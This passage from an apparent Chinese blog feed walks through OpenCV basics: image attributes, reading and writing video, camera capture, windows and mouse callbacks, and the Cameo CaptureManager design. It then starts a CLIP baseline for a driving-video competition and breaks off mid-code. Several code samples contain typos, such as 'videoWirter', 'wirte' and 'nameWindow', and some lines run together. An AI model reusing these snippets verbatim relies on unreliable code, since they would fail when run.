punctuation">]</span> <span class="token operator">=</span> my_roi <span class="token comment">#实现将图像一部分复制到图像另一个位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​确保两个区域在大小上一致很重要。如果大小不一致，NumPy会（立刻）控诉这两个形状不匹配。</p><p>​最后，我们可以访问numpy.array的属性，如下列代码所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xx.png'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>dtype<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​这三个属性的定义如下：</p><ul><li>shape：描述数组形状的一个元组。对于图像，它（依次）包括高度、宽度、通道数（如果是彩色图像的话）。shape元组的长度是确定图像是灰度的还是彩色的一种有用方法。对于灰度图像， <code>len(shape)==2</code>，对于彩色图像，<code>len(shape)==3</code>。</li><li>size：数组中的元素数。对于灰度图像，这和像素数是一样的。 对于BGR图像，它是像素数的3倍，因为每个像素都由3个元素（B、G 和R）表示。</li><li>·dtype：数组元素的数据类型。对于每个通道8位的图像，数据类型是numpy.uint8。</li></ul><p>总之，强烈建议在使用OpenCV时，了解NumPy的一般情况以及 numpy.array的特殊情况。这个类是Python中使用OpenCV进行所有图像处理的基础。</p><h3 id="读取-x2F-写入视频文件"><a href="#读取-x2F-写入视频文件" class="headerlink" title="读取/写入视频文件"></a>读取/写入视频文件</h3><p>​OpenCV提供了VideoCapture和VideoWriter类，支持各种视频文件格式。支持的格式取决于操作系统和OpenCV的构建配置，但是通常情况下，假设支持AVI格式是安全的。通过它的read方法，VideoCapture对象可以依次查询新的帧，直到到达视频文件的末尾。每一帧都是一幅BGR格式的图像。</p><p>​相反，图像可以传递给VideoWriter类的write方法，该方法将图像添加到VideoWriter的文件中。我们来看一个例子，从一个AVI文件读取帧，再用YUV编码将其写入另一个文件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2videoCapture <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token string">'xx.avi'</span><span class="token punctuation">)</span>fps <span class="token operator">=</span> videoCapture<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>CAP_PROP_FPS<span class="token punctuation">)</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>videoCapture<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>CAP_PROP_FRAME_WIDTH<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>videoCapture<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>CAP_PROP_FRAME_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>videoWirter <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoWriter<span class="token punctuation">(</span><span class="token string">'xx.avi'</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>VideoWriter_fourcc<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fps<span class="token punctuation">,</span> size<span class="token punctuation">)</span>success<span class="token punctuation">,</span> frame <span class="token operator">=</span> videoCapture<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> success<span class="token punctuation">:</span> <span class="token comment"># Loop until there are no more frames.</span>    videoWriter<span class="token punctuation">.</span>wirte<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    success<span class="token punctuation">,</span> frame <span class="token operator">=</span> videoCapture<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​VideoWriter类的构造函数的参数值得特别注意。必须指定一个视频文件的名称。具有此名称的所有之前存在的文件都将被覆盖。还必须指定一个视频编解码器。可用的编解码器因系统而异。支持的选项可能包括以下内容：</p><ul><li>·0：这个选项表示未压缩的原始视频文件。文件扩展名应该是.avi。</li><li>cv2.VideoWriter_fourcc(‘I’,’4’,’2’,’0’)：这个选项表示未压缩的YUV编 码，4:2:0色度抽样。这种编码是广泛兼容的，但是会产生大的文件。文件扩展名应该是.avi。</li><li>cv2.VideoWriter_fourcc(‘P’,’I’,’M’,’1’)：这个选项是MPEG-1。文件扩 展名应该是.avi。</li><li>cv2.VideoWriter_fourcc(‘X’,’V’,’I’,’D’)：这个选项是一种相对较旧的 MPEG-4编码。如果想限制生成的视频大小，这是一个不错的选项。文件扩展名应该是.avi。</li><li>cv2.VideoWriter_fourcc(‘M’,’P’,’4’,’V’)：这个选项是另一种相对较旧 的MPEG-4编码。如果想限制生成的视频大小，这是一个不错的选项。 文件扩展名应该是.mp4。</li><li>cv2.VideoWriter_fourcc(‘X’,’2’,’6’,’4’)：这个选项是一种相对较新的 MPEG-4编码。如果想限制生成的视频大小，这可能是最佳的选项。文件扩展名应该是.mp4。</li><li>·cv2.VideoWriter_fourcc(‘T’,’H’,’E’,’O’)：这个选项是Ogg Vorbis。文 件扩展名应该是.ogv。</li><li>·cv2.VideoWriter_fourcc(‘F’,’L’,’V’,’1’)：这个选项表示Flash视频。文 件扩展名应该是.flv。</li></ul><p>​帧率和帧大小也必须指定。因为我们是从另一个视频复制的，所以这些属性可以从VideoCapture类的get方法读取。</p><h3 id="捕捉摄像头帧"><a href="#捕捉摄像头帧" class="headerlink" title="捕捉摄像头帧"></a>捕捉摄像头帧</h3><p>​摄像头帧流也可以用VideoCapture对象来表示。但是，对于摄像头，我们通过传递摄像头设备索引（而不是视频文件名称）来构造 VideoCapture对象。我们来考虑下面这个例子，它从摄像头抓取10秒的视频，并将其写入AVI文件。代码与上节的示例（从视频文件获取的，而不是从摄像头中获取的）类似：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2videoCapture <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>fps <span class="token operator">=</span> videoCapture<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>CAP_PROP_FPS<span class="token punctuation">)</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>videoCapture<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>CAP_PROP_FRAME_WIDTH<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>videoCapture<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>CAP_PROP_FRAME_HEIGHT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>videoWirter <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoWriter<span class="token punctuation">(</span><span class="token string">'xx.avi'</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>VideoWriter_fourcc<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fps<span class="token punctuation">,</span> size<span class="token punctuation">)</span>success<span class="token punctuation">,</span> frame <span class="token operator">=</span> videoCapture<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>numFrameRemaining <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">*</span> fps <span class="token operator">-</span> <span class="token number">1</span> <span class="token comment"># 10 seconds of frames</span><span class="token keyword">while</span> success <span class="token keyword">and</span> numFrameRemaining <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    videoWriter<span class="token punctuation">.</span>wirte<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>    success<span class="token punctuation">,</span> frame <span class="token operator">=</span> videoCapture<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    numFrameRemaining <span class="token operator">-=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Tip:对于某些系统上的一些摄像头， cameraCapture.get(cv2.CAP_PROP_FRAME_WIDTH)和 cameraCapture.get(cv2.CAP_PROP_FRAME_HEIGHT)可能会返回不准确的结果。为了更加确定图像的实际大小，可以先抓取一帧，再用像 h,w=frame.shape[:2]这样的代码来获得图像的高度和宽度。有时，你可 能会遇到摄像头在开始产生大小稳定的好帧之前，产生一些大小不稳 定的坏帧的情况。如果你关心的是如何防范这种情况，在开始捕捉会话时你可能想要读取并忽略一些帧。</p><p>可是，在大多数情况下，VideoCapture的get方法不会返回摄像头帧率的准确值，通常会返回0。 <a href="http://docs.opencv.org/modules/highgui/doc/reading_and_writing_images_and_video.html">点击跳转</a>上的官方文档警告如下：</p><p>当查询VideoCapture实例使用的后端不支持的属性时，返回值为0。 注意： 读/写属性涉及许多层。沿着这条链可能会发生一些意想不到的结 果[sic]。 VideoCapture-&gt;API Backend-&gt;Operating System-&gt;DeviceDriver- &gt;Device Hardware 返回值可能与设备实际使用的值不同，也可能使用设备相关规则 （例如，步长或者百分比）对其进行编码。有效的行为取决于[sic]设备驱动程序和API后端。</p><p>要为摄像头创建合适的VideoWriter类，我们必须对帧率做一个假设（就像前面代码中所做的那样），或者使用计时器测量帧率。后一种方法更好，我们将在本章后面对其进行介绍。</p><p>当然，摄像头数量及其顺序取决于系统。可是，OpenCV不提供任何查询摄像头数量或者摄像头属性的方法。如果用无效的索引构造VideoCapture类，VideoCapture类将不会产生任何帧，它的read方法将返回(False,None)。要避免试图从未正确打开的VideoCapture对象检索帧，你可能想先调用VideoCapture.isOpened方法，返回一个布尔值。</p><p>当我们需要同步一组摄像头或者多摄像头相机（如立体摄像机）时，read方法是不合适的。我们可以改用grab和retrieve方法。对于一组（两台）摄像机，可以使用类似于下面的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">success0 <span class="token operator">=</span> cameraCapture0<span class="token punctuation">.</span>grab<span class="token punctuation">(</span><span class="token punctuation">)</span>success1 <span class="token operator">=</span> cameraCapture1<span class="token punctuation">.</span>grab<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> success0 <span class="token keyword">and</span> success1<span class="token punctuation">:</span>    frame0 <span class="token operator">=</span> cameraCapture0<span class="token punctuation">.</span>retrieve<span class="token punctuation">(</span><span class="token punctuation">)</span>    frame1 <span class="token operator">=</span> cameraCapture1<span class="token punctuation">.</span>retrieve<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​首先，<code>cameraCapture0.grab()</code>和<code>cameraCapture1.grab()</code>用于从两个摄像机中抓取帧。这些函数返回一个布尔值，表示帧是否成功抓取。如果返回<code>True</code>，则表示成功抓取帧；如果返回<code>False</code>，则表示抓取失败或到达视频的末尾。</p><p>​<code>cameraCapture.retrieve()</code>用于检索已经抓取的帧。这个函数返回一个元组，包含两个元素。第一个元素<code>frame0</code>是从<code>cameraCapture0</code>抓取的帧，第二个元素<code>frame1</code>是从<code>cameraCapture1</code>抓取的帧。</p><h3 id="在窗口中显示图像"><a href="#在窗口中显示图像" class="headerlink" title="在窗口中显示图像"></a>在窗口中显示图像</h3><p>​OpenCV中一个最基本的操作是在窗口中显示图像。这可以通过 imshow函数实现。如果你有任何其他GUI框架背景，那么可能认为调用 imshow来显示图像就足够了。可是，在OpenCV中，只有当调用另一个 函数waitKey时，才会绘制（或者重新绘制）窗口。后一个函数抽取窗 口事件队列（允许处理各种事件，比如绘图），并且它返回用户在指 定的超时时间内输入的任何键的键码。在某种程度上，这个基本设计简化了开发使用视频或网络摄像头输入的演示程序的任务，至少开发人员可以手动控制新帧的获取和显示。</p><p>​下面是一个非常简单的示例脚本，用于从文件中读取图像，并对 其进行显示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npimg <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xx.png'</span><span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'xx'</span><span class="token punctuation">,</span> img<span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>destroyAllWindows<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​imshow函数有两个参数：显示图像的窗口名称以及图像自己的名称。将在下一节中对waitKey进行更详细的介绍。</p><p>​恰如其名，destroyAllWindows函数会注销由OpenCV创建的所有窗 口。</p><h3 id="在窗口中显示摄像头帧"><a href="#在窗口中显示摄像头帧" class="headerlink" title="在窗口中显示摄像头帧"></a>在窗口中显示摄像头帧</h3><p>​OpenCV允许使用namedWindow、imshow和destroyWindow函数来创建、重新绘制和注销指定的窗口。此外，任何窗口都可以通过waitKey 函数捕获键盘输入，通过setMouseCallback函数捕获鼠标输入。我们来看一个例子，展示从实时摄像头获取的帧：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2clicked <span class="token operator">=</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">onMouse</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> clicked    <span class="token keyword">if</span> event <span class="token operator">==</span> cv2<span class="token punctuation">.</span>EVENT_LBUTTONUP<span class="token punctuation">:</span>        clicked <span class="token operator">=</span> <span class="token boolean">True</span>cameraCapture <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>nameWindow<span class="token punctuation">(</span><span class="token string">'MyWindow'</span><span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>setMouseCallback<span class="token punctuation">(</span><span class="token string">'MyWindow'</span><span class="token punctuation">,</span> onMouse<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Showing camera feed. Click window or press any key to stop'</span><span class="token punctuation">)</span>success<span class="token punctuation">,</span> frame <span class="token operator">=</span> cameraCapture<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> success <span class="token keyword">and</span> cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token keyword">not</span> clicked<span class="token punctuation">:</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">'MyWindow'</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>    success<span class="token punctuation">,</span> frame <span class="token operator">=</span> cameraCapture<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>destroyWindow<span class="token punctuation">(</span><span class="token string">'MyWindow'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​waitKey的参数是等待键盘输入的毫秒数，默认情况下为0，这是 一个特殊的值，表示无穷大。返回值可以是-1（表示未按下任何 键），也可以是ASCII键码（如27表示Esc）。有关ASCII键码的列表， 请参阅<a href="http://www.asciitable.com/">点击跳转</a>。另外，请注意Python提供了一 个标准函数ord，可以将字符转换成ASCII键码。例如，ord(‘a’)返回 97。</p><p>​同样，请注意，OpenCV的窗口函数和waitKey是相互依赖的。 OpenCV窗口只在调用waitKey时更新。相反，waitKey只在OpenCV窗口 有焦点时才捕捉输入。</p><p>​传递给setMouseCallback的鼠标回调应有5个参数，如代码示例所 示。把回调的param参数设置为setMouseCallback的第3个可选参数， 默认情况下为0。回调的事件参数是以下操作之一：</p><ul><li>cv2.EVENT_MOUSEMOVE：这个事件指的是鼠标移动。</li><li>cv2.EVENT_LBUTTONDOWN：这个事件指的是按下左键时， 左键向下。</li><li>cv2.EVENT_RBUTTONDOWN：这个事件指的是按下右键时， 右键向下。</li><li>cv2.EVENT_MBUTTONDOWN：这个事件指的是按下中间键时，中间键向下。</li><li>·cv2.EVENT_LBUTTONUP：这个事件指的是释放左键时，左键回到原位。</li><li>cv2.EVENT_RBUTTONUP：这个事件指的是释放右键时，右键回到原位。</li><li>cv2.EVENT_MBUTTONUP：这个事件指的是释放中间键时，中间键回到原位。</li><li>cv2.EVENT_LBUTTONDBLCLK：这个事件指的是双击左键。</li><li>cv2.EVENT_RBUTTONDBLCLK：这个事件指的是双击右键。</li><li>cv2.EVENT_MBUTTONDBLCLK：这个事件指的是双击中间键。</li></ul><p>鼠标回调的flag参数可能是以下事件的一些按位组合：</p><ul><li>cv2.EVENT_FLAG_LBUTTON：这个事件指的是按下左键。</li><li>cv2.EVENT_FLAG_RBUTTON：这个事件指的是按下右键。</li><li>cv2.EVENT_FLAG_MBUTTON：这个事件指的是按下中间键。</li><li>cv2.EVENT_FLAG_CTRLKEY：这个事件指的是按下Ctrl键。</li><li>cv2.EVENT_FLAG_SHIFTKEY：这个事件指的是按下Shift键。</li><li>cv2.EVENT_FLAG_ALTKEY：这个事件指的是按下Alt键。</li></ul><p>​可是，OpenCV不提供任何手动处理窗口事件的方法。例如，单窗口关闭按钮不能停止应用程序。因为OpenCV的事件处理和GUI功能有 限，许多开发人员更喜欢将其与其他应用程序框架集成。在下一节中，我们将设计一个抽象层来帮助OpenCV与应用程序框架集成。</p><h2 id="项目Cameo（人脸跟踪和图像处理）面向对象的设计"><a href="#项目Cameo（人脸跟踪和图像处理）面向对象的设计" class="headerlink" title="项目Cameo（人脸跟踪和图像处理）面向对象的设计"></a>项目Cameo（人脸跟踪和图像处理）面向对象的设计</h2><p>​可以用纯过程式风格编写Python应用程序。通常，这是通过小型应用程序（例如前面讨论过的基本I/O脚本）实现的。但是，从现在开始，我们将经常使用面向对象的风格，因为面向对象促进了模块化和可扩展性。</p><p>​从对OpenCV的I/O功能的概述中，我们知道不管源图像或者目标图像是什么，所有图像都是相似的。不管获取的图像流是什么，或者将其作为输出发送到哪里，我们都可以对这个流的每一帧应用相同的特定于应用程序的逻辑。在使用多个I/O流的应用程序（例如Cameo）中，I/O代码和应用程序代码的分离变得特别方便。</p><p>​我们将创建的类命名为CaptureManager和WindowManager，作为 I/O流的高级接口。应用程序代码可以使用CaptureManager读取新帧，也可以将每一帧分派给一个或多个输出，包括静态图像文件、视频文件和窗口（通过WindowManager类）。WindowManager类允许应用程序 代码以面向对象风格处理窗口和事件。 CaptureManager和WindowManager都是可扩展的。我们可以实现不依赖OpenCV的I/O。</p><h3 id="基于managers-CaptureManager提取视频流"><a href="#基于managers-CaptureManager提取视频流" class="headerlink" title="基于managers.CaptureManager提取视频流"></a>基于managers.CaptureManager提取视频流</h3><p>​正如我们所看到的，OpenCV可以获取、显示和记录来自视频文件或来自摄像头的图像流，但是在每种情况下都会有一些特殊考虑的事项。CaptureManager类提取了一些差异并提供了一个更高级的接口， 将图像从获取流分发到一个或多个输出——静态图像文件、视频文件，或者窗口。</p><p>​CaptureManager对象是由VideoCapture对象初始化的，并拥有 enterFrame和exitFrame方法，通常应该在应用程序主循环的每次迭代 中调用这两个方法。在调用enterFrame和exitFrame之间，应用程序可 以（任意次）设置一个channel属性并获得一个frame属性。channel属 性初始为0，只有多摄像头相机使用其他值。frame属性是在调用 enterFrame时，对应于当前通道状态的一幅图像。</p><p>​CaptureManager类还拥有可以在任何时候调用的writeImage、 startWriting Video和stopWritingVideo方法。实际的文件写入被推迟到exitFrame。同样，在执行exitFrame方法期间，可以在窗口中显示frame，这取决于应用程序代码将WindowManager类作为CaptureManager构造函数的参数提供，还是通过设置 previewWindowManager属性提供。</p><p>​如果应用程序代码操作frame，那么将在记录文件和窗口中体现这些操作。CaptureManager类有一个构造函数参数和一个名为 shouldMirrorPreview的属性，如果想要在窗口中镜像（水平翻转） frame，但不记录在文件中，那么此属性应该为True。通常，在面对摄像头时，用户更喜欢镜像实时摄像头回传信号。</p>]]></content>
      
      
      <categories>
          
          <category> OpenCV </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenCV </tag>
            
            <tag> CV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Datawhale智能汽车多模态(1)--读懂Baseline</title>
      <link href="/2023/11/15/datawhale-zhi-neng-qi-che-duo-mo-tai-1-du-dong-baseline/"/>
      <url>/2023/11/15/datawhale-zhi-neng-qi-che-duo-mo-tai-1-du-dong-baseline/</url>
      
        <content type="html"><![CDATA[<h2 id="赛题：智能驾驶汽车虚拟仿真视频数据理解赛道"><a href="#赛题：智能驾驶汽车虚拟仿真视频数据理解赛道" class="headerlink" title="赛题：智能驾驶汽车虚拟仿真视频数据理解赛道"></a>赛题：智能驾驶汽车虚拟仿真视频数据理解赛道</h2><p><a href="https://tianchi.aliyun.com/competition/entrance/532155">赛事链接</a></p><p>基础思路：使用文本与图像进行匹配</p><h2 id="Baseline"><a href="#Baseline" class="headerlink" title="Baseline"></a>Baseline</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> paddle<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> clip <span class="token keyword">import</span> tokenize<span class="token punctuation">,</span> load_model<span class="token keyword">import</span> glob<span class="token punctuation">,</span> json<span class="token punctuation">,</span> os<span class="token keyword">import</span> cv2<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm_notebook<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> normalize<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltmodel<span class="token punctuation">,</span> transforms <span class="token operator">=</span> load_model<span class="token punctuation">(</span><span class="token string">'ViT_B_32'</span><span class="token punctuation">,</span> pretrained<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>en_match_words <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"scerario"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"suburbs"</span><span class="token punctuation">,</span><span class="token string">"city street"</span><span class="token punctuation">,</span><span class="token string">"expressway"</span><span class="token punctuation">,</span><span class="token string">"tunnel"</span><span class="token punctuation">,</span><span class="token string">"parking-lot"</span><span class="token punctuation">,</span><span class="token string">"gas or charging stations"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"weather"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"clear"</span><span class="token punctuation">,</span><span class="token string">"cloudy"</span><span class="token punctuation">,</span><span class="token string">"raining"</span><span class="token punctuation">,</span><span class="token string">"foggy"</span><span class="token punctuation">,</span><span class="token string">"snowy"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"period"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"daytime"</span><span class="token punctuation">,</span><span class="token string">"dawn or dusk"</span><span class="token punctuation">,</span><span class="token string">"night"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"road_structure"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"normal"</span><span class="token punctuation">,</span><span class="token string">"crossroads"</span><span class="token punctuation">,</span><span class="token string">"T-junction"</span><span class="token punctuation">,</span><span class="token string">"ramp"</span><span class="token punctuation">,</span><span class="token string">"lane merging"</span><span class="token punctuation">,</span><span class="token string">"parking lot entrance"</span><span class="token punctuation">,</span><span class="token string">"round about"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"general_obstacle"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"speed bumper"</span><span class="token punctuation">,</span><span class="token string">"traffic cone"</span><span class="token punctuation">,</span><span class="token string">"water horse"</span><span class="token punctuation">,</span><span class="token string">"stone"</span><span class="token punctuation">,</span><span class="token string">"manhole cover"</span><span class="token punctuation">,</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"abnormal_condition"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"uneven"</span><span class="token punctuation">,</span><span class="token string">"oil or water stain"</span><span class="token punctuation">,</span><span class="token string">"standing water"</span><span class="token punctuation">,</span><span class="token string">"cracked"</span><span class="token punctuation">,</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"ego_car_behavior"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"slow down"</span><span class="token punctuation">,</span><span class="token string">"go straight"</span><span class="token punctuation">,</span><span class="token string">"turn right"</span><span class="token punctuation">,</span><span class="token string">"turn left"</span><span class="token punctuation">,</span><span class="token string">"stop"</span><span class="token punctuation">,</span><span class="token string">"U-turn"</span><span class="token punctuation">,</span><span class="token string">"speed up"</span><span class="token punctuation">,</span><span class="token string">"lane change"</span><span class="token punctuation">,</span><span class="token string">"others"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"closest_participants_type"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"passenger car"</span><span class="token punctuation">,</span><span class="token string">"bus"</span><span class="token punctuation">,</span><span class="token string">"truck"</span><span class="token punctuation">,</span><span class="token string">"pedestrain"</span><span class="token punctuation">,</span><span class="token string">"policeman"</span><span class="token punctuation">,</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"others"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"closest_participants_behavior"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"slow down"</span><span class="token punctuation">,</span><span class="token string">"go straight"</span><span class="token punctuation">,</span><span class="token string">"turn right"</span><span class="token punctuation">,</span><span class="token string">"turn left"</span><span class="token punctuation">,</span><span class="token string">"stop"</span><span class="token punctuation">,</span><span class="token string">"U-turn"</span><span class="token punctuation">,</span><span class="token string">"speed up"</span><span class="token punctuation">,</span><span class="token string">"lane change"</span><span class="token punctuation">,</span><span class="token string">"others"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span>submit_json <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"author"</span> <span class="token punctuation">:</span> <span class="token string">"abc"</span> <span class="token punctuation">,</span>    <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"231011"</span><span class="token punctuation">,</span>    <span class="token string">"model"</span> <span class="token punctuation">:</span> <span class="token string">"model_name"</span><span class="token punctuation">,</span>    <span class="token string">"test_results"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span>paths <span class="token operator">=</span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'./初赛测试视频/*'</span><span class="token punctuation">)</span>paths<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> video_path <span class="token keyword">in</span> paths<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>video_path<span class="token punctuation">)</span>        clip_id <span class="token operator">=</span> video_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    cap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span>video_path<span class="token punctuation">)</span>    img <span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    image <span class="token operator">=</span> cv2<span class="token 